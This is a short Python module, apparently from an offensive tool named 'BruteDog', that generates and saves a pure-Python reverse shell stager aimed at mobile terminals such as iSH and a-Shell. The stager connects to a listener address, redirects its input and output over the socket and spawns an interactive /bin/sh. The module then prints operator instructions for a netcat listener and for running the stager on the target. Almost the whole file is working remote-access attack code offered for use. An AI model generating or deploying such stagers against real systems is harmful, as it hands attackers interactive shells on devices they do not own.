import os
import sys

def generate_python_reverse_shell_stager(listener_ip, listener_port):
    """
    Generates a pure-Python reverse shell stager payload engineered for 
    mobile environments (iSH / a-Shell) without any external dependencies.
    """
    stager_code = f'''# BruteDog Mobile C2 Reverse Shell Stager
import socket, subprocess, os, sys
def spawn_c2_shell():
    HOST = "{listener_ip}"
    PORT = {listener_port}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        sys.exit(1)
if __name__ == "__main__":
    spawn_c2_shell()
'''
    os.makedirs("reports/payloads", exist_ok=True)
    payload_path = "reports/payloads/c2_stager.py"
    with open(payload_path, "w") as f:
        f.write(stager_code)
    return payload_path

def deploy_c2_stager(listener_ip="10.0.0.5", listener_port=4444):
    """Compiles and reports instructions for operator listener deployment."""
    print(f"\n\033[95m[***] DEPLOYING C2 CALLBACK STAGER MODULE [***]\033[0m")
    path = generate_python_reverse_shell_stager(listener_ip, listener_port)
    print(f" \033[92m[+] Mobile C2 Stager compiled successfully -> Saved to: {path}\033[0m")
    print(f" \033[93m[*] Operator Listener Instruction:\033[0m")
    print(f"     1. Run netcat on your listener node: nc -lvnp {listener_port}")
    print(f"     2. Execute stager on target/mobile terminal: python3 {path}\n")
    return path
